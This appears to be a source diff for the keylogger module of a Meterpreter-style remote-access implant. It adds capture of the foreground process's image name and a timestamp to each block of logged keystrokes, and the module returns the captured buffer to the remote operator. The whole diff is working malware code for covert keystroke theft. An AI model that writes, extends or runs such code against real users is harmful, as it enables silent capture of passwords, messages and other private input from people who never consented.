@@ -1,6 +1,7 @@
 #include "precomp.h"
 #include "raw.h"
 #include <tchar.h>
+#include <Psapi.h>
 
 extern HMODULE hookLibrary;
 extern HINSTANCE hAppInstance;
@@ -53,18 +54,40 @@ typedef enum { false=0, true=1 } bool;
 
 
 /*
- * function pointers for the raw input api
+ * required function pointers
  */
 
 f_GetRawInputData fnGetRawInputData;
 f_RegisterRawInputDevices fnRegisterRawInputDevices;
+f_GetProcessImageFileNameW fnGetProcessImageFileNameW;
+f_QueryFullProcessImageNameW fnQueryFullProcessImageNameW;
 
 bool boom[1024];
 const char g_szClassName[] = "klwClass";
 HANDLE tKeyScan = NULL;
 const unsigned int KEYBUFSIZE = 1024 * 1024;
 WCHAR *keyscan_buf = NULL;
-unsigned int idx = 0;
+size_t idx = 0;
+WCHAR active_image[MAX_PATH] = L"Logging started";
+WCHAR prev_active_image[MAX_PATH] = { 0 };
+
+/*
+ * needed for process enumeration 
+ */
+
+typedef struct {
+	DWORD ppid;
+	DWORD cpid;
+} wndinfo;
+
+
+BOOL CALLBACK ecw_callback(HWND hWnd, LPARAM lp) {
+	wndinfo* info = (wndinfo*)lp;
+	DWORD pid = 0;
+	GetWindowThreadProcessId(hWnd, &pid);
+	if (pid != info->ppid) info->cpid = pid;
+	return TRUE;
+}
 
 /*
  *  key logger updates begin here
@@ -72,7 +95,7 @@ unsigned int idx = 0;
 
 int WINAPI ui_keyscan_proc()
 {
-WNDCLASSEX klwc;
+	WNDCLASSEX klwc;
     HWND hwnd;
     MSG msg;
     int ret = 0;
@@ -80,7 +103,7 @@ WNDCLASSEX klwc;
     if (fnGetRawInputData == NULL || fnRegisterRawInputDevices == NULL)
     {
       ret = ui_resolve_raw_api();
-      if (ret != 1)		 // resolving functions failed
+      if (!ret)		 // api resolution failed
       {
         return 0;
       }
@@ -211,7 +234,7 @@ DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
 }
 
 /*
- * Stops they keyboard sniffer
+ * Stops the keyboard sniffer
  */
 DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
 {
@@ -267,7 +290,11 @@ DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request)
 		utf8_keyscan_buf = wchar_to_utf8(keyscan_buf);
 		packet_add_tlv_raw(response, TLV_TYPE_KEYS_DUMP, (LPVOID)utf8_keyscan_buf, strlen(utf8_keyscan_buf)+1);
 		memset(keyscan_buf, 0, KEYBUFSIZE);
+
+		// reset index and zero active window string so the current one
+		// is logged again
 		idx = 0;
+		RtlZeroMemory(prev_active_image, MAX_PATH);
 	}
 	else {
 		result = 1;
@@ -286,6 +313,13 @@ int ui_log_key(UINT vKey)
 {
     BYTE lpKeyboard[256];
 	WCHAR kb[16] = { 0 };
+	HWND foreground_wnd;
+	HANDLE active_proc;
+	SYSTEMTIME st;
+	wndinfo info = { 0 };
+	DWORD mpsz = MAX_PATH;
+	WCHAR date_s[256] = { 0 };
+	WCHAR time_s[256] = { 0 };
 
 	GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
 	GetKeyboardState(lpKeyboard);
@@ -295,6 +329,32 @@ int ui_log_key(UINT vKey)
 	if ((idx + 16) >= KEYBUFSIZE)
 	{
 		idx = 0;
+	}
+
+	// get focused window pid
+	foreground_wnd = GetForegroundWindow();
+	GetWindowThreadProcessId(foreground_wnd, &info.ppid);
+	info.cpid = info.ppid;
+
+	// resolve full image name
+	EnumChildWindows(foreground_wnd, ecw_callback, (LPARAM)&info);
+	active_proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, info.cpid);
+	
+	if (active_proc) {
+		// if null, we're on pre-vista or something is terribly wrong
+		(fnQueryFullProcessImageNameW) ? fnQueryFullProcessImageNameW(active_proc, 0, (LPTSTR)active_image, &mpsz) : fnGetProcessImageFileNameW(active_proc, (LPTSTR)active_image, mpsz);
+
+		// new window in focus, notate it
+		if (wcscmp(active_image, prev_active_image) != 0)
+		{
+			GetSystemTime(&st);
+			GetDateFormatW(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, &st, NULL, date_s, sizeof(date_s));
+			GetTimeFormatW(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT, &st, NULL, time_s, sizeof(time_s));
+			idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"\n>>>\n%s\n@ %s %s UTC\n<<<\n", active_image, date_s, time_s);
+			RtlZeroMemory(prev_active_image, MAX_PATH);
+			_snwprintf(prev_active_image, MAX_PATH, L"%s", active_image);
+		}
+		CloseHandle(active_proc);
 	}
 
 	switch (vKey)
@@ -334,16 +394,40 @@ int ui_log_key(UINT vKey)
 }
 
 /*
- * resolve the required functions from the raw input api 
+ * resolve required functions
  */
 
 int ui_resolve_raw_api()
 {
-  HINSTANCE hu32 = LoadLibrary("user32.dll");
+  HANDLE hu32 = LoadLibrary("user32.dll");
+  HANDLE psapi = LoadLibrary("psapi.dll");
+  HANDLE kernel32 = LoadLibrary("kernel32.dll");
 
-  if (hu32 == NULL)
+  if (!hu32 || !kernel32 || !psapi)
   {
-    return 0;
+	  return 0;
+  }
+
+  fnQueryFullProcessImageNameW = (f_QueryFullProcessImageNameW)GetProcAddress(kernel32, "QueryFullProcessImageNameW");
+  if (!fnQueryFullProcessImageNameW)
+  {
+	  // Pre Vista -> GetProcessImageFileName
+	  HANDLE psapi = LoadLibrary("Psapi.dll");
+	  if (!psapi)
+	  {
+		  return 0;
+	  }
+	  fnGetProcessImageFileNameW = (f_GetProcessImageFileNameW)GetProcAddress(psapi, "GetProcessImageFileNameW");
+	  if (!fnGetProcessImageFileNameW)
+	  {
+		  return 0;
+	  }
+  }
+
+  fnGetProcessImageFileNameW = (f_GetProcessImageFileNameW)GetProcAddress(psapi, "GetProcessImageFileNameW");
+  if (!fnGetProcessImageFileNameW)
+  {
+	  return 0;
   }
 
   fnGetRawInputData = (f_GetRawInputData)GetProcAddress(hu32, "GetRawInputData");
